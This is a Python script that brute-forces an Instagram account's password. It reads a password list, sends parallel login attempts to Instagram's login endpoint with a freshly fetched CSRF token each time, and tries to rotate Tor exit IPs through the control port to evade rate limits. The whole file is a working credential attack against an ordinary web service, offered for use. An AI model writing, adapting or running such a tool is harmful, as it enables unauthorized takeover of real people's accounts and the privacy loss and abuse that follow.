import requests
import time
import sys
from datetime import datetime
from colorama import init, Fore, Style
import concurrent.futures
import subprocess

# Initialize colorama
init(autoreset=True)

# Function to rotate Tor IP
def rotate_tor_ip():
    print(Fore.YELLOW + "[*] Rotating Tor IP...")
    try:
        subprocess.run(["echo", "SIGNAL NEWNYM", "|", "nc", "127.0.0.1", "9051"], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Failed to rotate IP: {e}")

# Function to make requests through Tor with session
def instagram_login(username, password, session):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    # Use the current timestamp
    timestamp = int(datetime.now().timestamp())
    
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    # Start session and get the CSRF token dynamically
    try:
        session.get("https://www.instagram.com/")  # to initialize cookies
        csrf_token = session.cookies['csrftoken']

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf_token
        }

        # Send POST request
        login_response = session.post(login_url, data=payload, headers=headers)
        login_response.raise_for_status()  # Raise an error for bad responses

        response_data = login_response.json()

        # Check for successful login
        if response_data.get('authenticated', False):
            return True
        else:
            return False

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Request error: {e}")
        return False
    except KeyError:
        print(Fore.RED + "[-] Failed to retrieve CSRF token")
        return False
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error: {e}")
        return False

# Function to try each password
def try_password(username, password, session):
    print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)

    if instagram_login(username, password, session):
        print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
        return True
    else:
        print(Fore.RED + f"Status = [Fail]")
        return False

def main():
    username = input("Enter Instagram username to bruteforce: ")
    password_file = "passwords.txt"

    try:
        with open(password_file, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + f"[-] Error: {password_file} not found.")
        sys.exit(1)

    print(Fore.GREEN + f"[*] Starting bruteforce attack on {username}")
    print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")

    # Initialize session for requests
    session = requests.Session()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = {executor.submit(try_password, username, password, session): password for password in passwords}

        for i, future in enumerate(concurrent.futures.as_completed(results)):
            if future.result():  # If the login is successful
                print(Fore.GREEN + "[*] Bruteforce attack completed.")
                break
            # Rotate IP every 100 attempts
            if i % 100 == 0:
                rotate_tor_ip()

    print(Fore.GREEN + "[*] Attack finished or interrupted.")

if __name__ == "__main__":
    main() 
